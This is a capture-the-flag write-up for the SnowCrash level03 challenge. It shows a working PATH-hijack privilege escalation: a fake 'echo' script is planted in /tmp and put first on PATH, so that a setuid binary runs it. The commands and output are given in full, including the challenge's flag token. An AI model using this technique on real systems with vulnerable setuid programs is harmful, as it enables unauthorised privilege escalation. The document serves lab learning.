
## --------------> Vulnerability

Privilege escalation Using PATH Variable

We have an executable with in our home directory.
```
level03@SnowCrash:~$ ls -l level03
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```

Let's use the strings debugger to try to exploit the binary as instructed:

```
level03@SnowCrash:~$ strings level03 | grep "Exploit me"
/usr/bin/env echo Exploit me
```

We can see that the binary uses '/usr/bin/env echo' to print "Exploit me," so we'll do as suggested and exploit it.
we make  simple file called "echo" and have it call '/bin/getflag' when called. We will create it in '/tmp' due to permissions constraints.

```
level03@SnowCrash:~$ cd /tmp && echo '/bin/getflag' > echo
level03@SnowCrash:/tmp$ chmod 777 echo && ls -l echo
-rwxrwxrwx 1 level03 level03 13 Mar 11 23:37 echo
```
Go back to level03 home folder then add `/tmp` to the variable env `$PATH`

```
level03@SnowCrash:/tmp$ export PATH=/tmp:$PATH
level03@SnowCrash:/tmp$ printenv | grep "PATH"
PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
```

Now we can re-execute `level03`

```
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
level03@SnowCrash:~$ su level04
Password:
level04@SnowCrash:~$
```


